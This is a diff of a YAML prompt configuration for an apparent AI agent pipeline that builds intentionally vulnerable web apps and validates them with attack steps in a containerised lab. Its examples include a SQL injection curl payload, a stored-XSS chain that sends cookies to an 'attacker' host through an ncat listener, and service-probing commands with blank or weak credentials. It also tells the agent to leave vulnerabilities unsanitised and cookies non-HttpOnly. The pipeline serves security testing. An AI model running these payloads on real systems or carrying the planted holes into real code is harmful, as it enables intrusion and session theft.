@@ -576,10 +576,11 @@ generate_app_task:
        endpoints or handlers (e.g. one endpoint for upload, another for file inclusion).
     2. Read the SYNTHESIS CONTEXT to understand the exact credentials, usernames, and
        scenario details. Seed data MUST match synthesis_context exactly.
-    3. Read ALL ATTACK GOAL test_templates and success_criteria — your attack_snippet
-       must demonstrate the FULL chain across all vulnerabilities. For chained attacks,
-       the attack_snippet should execute each step in sequence (e.g. upload webshell
-       first, then trigger it via LFI).
+    3. Read ALL ATTACK GOAL test_templates and success_criteria — your attack_objective
+       must provide a structured task for the Attack Orchestrator to demonstrate the
+       FULL chain across all vulnerabilities. For chained attacks, the attack_objective
+       should describe each step in sequence (e.g. upload webshell first, then trigger
+       it via LFI).
     4. Write app_source as a single file implementing ALL vulnerabilities. Each vuln
        should have its own endpoint/route. The vulnerabilities must be exactly as
        described in the atoms' Synthesis Guidance — do not sanitise them or add protections.
@@ -614,9 +615,39 @@ generate_app_task:
     9. Write testing_snippet to verify: (a) the web server is responding, (b) EACH
        vulnerability is present in the app. For chained vulns, test the full chain.
        Run inside the target container.
-    10. Write attack_snippet to exploit the FULL vulnerability chain from an attacker
-        container. For multi-vuln apps, execute each exploitation step in sequence.
+    10. Write attack_objective as a structured multi-step task for the Attack Orchestrator.
+        Format each step with a prefix:
+        - "Run in attacker: <command>" for CLI commands from the attacker container
+        - "In browser: <action>" for browser-based actions (form filling, clicking, navigation)
+        - "Run in target: <command>" for diagnostics in the target (rarely needed)
+        End with "Success criterion: <observable outcome or regex pattern>".
+        For multi-vuln apps, describe each exploitation step in sequence.
         The target is addressed as hostname "target" on the runtime's default port.
+
+        Example for SQLi:
+          Step 1: Run in attacker: curl -s "http://target:5000/search?q=x'+UNION+SELECT+username,password+FROM+users--+-"
+          Success criterion: response contains a bcrypt hash or plaintext credential
+
+        Example for XSS cookie theft:
+          Step 1: Run in attacker: rm -f /tmp/exfil.txt && ncat -lnvp 9999 > /tmp/exfil.txt &
+          Step 2: Run in attacker: curl -s -X POST "http://target:3000/comment" --data-urlencode "comment=<script>new Image().src='http://attacker:9999/?c='+document.cookie</script>"
+          Step 3: In browser: navigate to http://target:3000/admin to receive admin session cookie, then navigate to http://target:3000/ to trigger the stored XSS payload
+          Step 4: Run in attacker: sleep 10 && cat /tmp/exfil.txt
+          Success criterion: /tmp/exfil.txt contains connect.sid= or admin_token=
+
+        CRITICAL FOR XSS APPS: Do NOT add Puppeteer, chromium, or any admin-bot
+        inside the app. Do NOT add a trigger-bot endpoint. Chromium is NOT available
+        in the target container. Instead, use "In browser:" steps in attack_objective
+        — the external browser sidecar will simulate the admin visiting the page.
+        The app only needs: (1) POST endpoint to store comments unsanitized,
+        (2) GET endpoint to render stored comments (XSS fires here),
+        (3) /admin endpoint that sets a non-HttpOnly session cookie.
+
+        CRITICAL: Session cookies for XSS theft MUST be non-HttpOnly so JS can
+        read document.cookie. In Express use:
+          res.cookie('admin_token', 'value', { httpOnly: false, path: '/' });
+        NEVER use res.setHeader('Set-Cookie', '...HttpOnly=false') — that syntax
+        sets HttpOnly to true (the =false is ignored).
 
     CRITICAL OUTPUT RULE: Your ENTIRE response must be a single valid JSON object
     and NOTHING ELSE. No markdown, no headers, no reasoning text, no numbered lists,
@@ -629,7 +660,7 @@ generate_app_task:
     Start the response with { and end with }. All keys must be quoted strings.
     The JSON object must be a GeneratedApp with: app_filename (str), app_source (str),
     schema_sql (str or null), seed_sql (str or null), setup_db_sh (str or null),
-    deploy_snippet (str), testing_snippet (str), attack_snippet (str).
+    deploy_snippet (str), testing_snippet (str), attack_objective (str).
   agent: app_generation_agent
 
 generate_snippets_task:
@@ -699,9 +730,26 @@ generate_snippets_task:
         Never use `target`, `localhost`, or a box hostname here.
 
     STEP 5 — Generate the attack_snippet (or null).
-    Determine whether this atom has an EXTERNAL ATTACK SURFACE — meaning an
-    attacker on a separate machine could probe or exploit it over the network.
-      - If YES (e.g. samba_insecure_share, create_user with SSH context):
+    Determine whether THIS ATOM BY ITSELF exposes a remotely exploitable
+    surface — meaning an attacker on a separate machine could probe or exploit
+    it over the network using ONLY the state this atom produces.
+
+    CRITICAL: "Infrastructure" atoms that merely create resources (users,
+    files, packages, directories) do NOT have their own attack surface even
+    if a LATER atom turns them into one. The attack_snippet for those atoms
+    MUST be null. The remote surface belongs to the atom that ACTIVATES it.
+
+    Examples of atoms that MUST have attack_snippet = null:
+      - create_user:        creates an OS user; SSH login is proven by the
+                            weak_service_password / SSH-enabling atom that
+                            runs after it.
+      - install_package:    installs a package; exposure belongs to whatever
+                            atom configures the service.
+      - set_suid, set_capability, sensitive_file (no service):
+                            local-only effects, fully covered by Layer 1.
+
+      - If YES — this atom itself brings a service online or directly exposes
+        the vulnerability over the network:
         Write a Bash command that probes the vulnerability from an attacker's
         perspective. The attacker container is Kali-based and addresses the
         target by hostname `{target_hostname}` on a Docker bridge network.
@@ -721,16 +769,17 @@ generate_snippets_task:
 
         Examples (replace TARGET_HOST with `{target_hostname}`):
           - samba_insecure_share:       `smbclient -L //TARGET_HOST/<share_name> -N`
-          - create_user with SSH:       `sshpass -p '<password>' ssh -o StrictHostKeyChecking=no <username>@TARGET_HOST id`
+          - weak_service_password (SSH):`sshpass -p '<password>' ssh -o StrictHostKeyChecking=no <username>@TARGET_HOST id`
           - redis_disable_auth:         `redis-cli -h TARGET_HOST ping && redis-cli -h TARGET_HOST keys '*'`
           - postgres_rce:               `PGPASSWORD='' psql -U <db_user> -h TARGET_HOST -c '\du'`
           - database_expose (MySQL):    `mysql -h TARGET_HOST -u root --password= -e 'show databases;'`
           - mongodb_disable_auth:       `mongosh --host TARGET_HOST --eval "db.adminCommand('listDatabases')"`
           - ftp_anon_upload:            `curl -T /etc/hostname ftp://TARGET_HOST/<upload_dir>/test.txt --user anonymous:`
         Do NOT include a shebang line.
-      - If NO (e.g. install_package, set_suid, sensitive_file with no network
-        exposure): set attack_snippet to null.
-        These atoms only affect local state and are fully covered by Layer 1.
+      - If NO — this atom only creates infra (users, files, packages) or
+        only affects local state: set attack_snippet to null.
+        These atoms are fully covered by Layer 1; the remote surface is
+        proven by a later activating atom's L2 probe.
 
     STEP 6 — Build the GeneratedSnippet.
     Create a GeneratedSnippet with:
@@ -750,9 +799,12 @@ generate_snippets_task:
     - You MUST call `read_atom` for this atom. No exceptions.
     - The atom markdown is a scaffold. The `context` field is your brief for
       security intent — use it to make decisions the template leaves open.
-    - For attack_snippet: only atoms with NETWORK-FACING services get one.
-      Local-only atoms (install_package, set_suid, sensitive_file not exposed
-      via a service) must have attack_snippet set to null.
+    - For attack_snippet: ONLY atoms that themselves bring a network-facing
+      service online (or directly expose the vulnerability over the network)
+      get one. Infrastructure atoms (create_user, install_package, set_suid,
+      sensitive_file not exposed via a service) must have attack_snippet set
+      to null — their remote surface, if any, is proven by the later atom
+      that activates it.
   expected_output: >
     A single valid JSON object — no markdown, no surrounding text.
     Start the response with { and end with }. All keys must be quoted strings.
@@ -911,3 +963,46 @@ fix_attack_snippet_task:
     before or after. Start the response with { and end with }.
     Fields: fixed_attack_snippet (str), diagnosis (str), confidence (str).
   agent: attack_agent
+
+attack_orchestrator_task:
+  description: >
+    Validate a vulnerable web application: first confirm it is deployed correctly
+    (L1), then execute the exploit (L2).
+
+    APP: {app_filename}
+    APP SOURCE:
+    {app_source}
+
+    TESTING SNIPPET (L1 bash check):
+    {testing_snippet}
+
+    ATTACK OBJECTIVE (L2 multi-step task):
+    {attack_objective}
+
+    TARGET BASE URL: http://target:{port}
+    SYNTHESIS CONTEXT: {synthesis_context}
+
+    ATTEMPT: {attempt_number} of {max_attempts}
+    {failure_context}
+
+    Execute the L1 check and L2 attack objective using your tools. Return your
+    verdict as an AttackOrchestratorResult.
+
+    IMPORTANT: After using your tools, you MUST synthesize your findings and return
+    a final JSON result. Do NOT just return tool call results — analyze them and
+    produce the AttackOrchestratorResult JSON as your final answer.
+  expected_output: >
+    A single raw JSON object — no markdown, no surrounding text.
+    Fields: l1_passed (bool), l2_passed (bool), l1_evidence (str),
+    l2_evidence (str), reasoning (str), used_browser (bool).
+
+    Example:
+    {
+      "l1_passed": true,
+      "l2_passed": true,
+      "l1_evidence": "Web server responding on port 3000. XSS payload present in comments table.",
+      "l2_evidence": "Exfil file contains: connect.sid=s%3AaBcDeFg",
+      "reasoning": "L1 verified app deployment. L2 successfully exfiltrated admin session cookie via stored XSS.",
+      "used_browser": true
+    }
+  agent: attack_orchestrator_agent
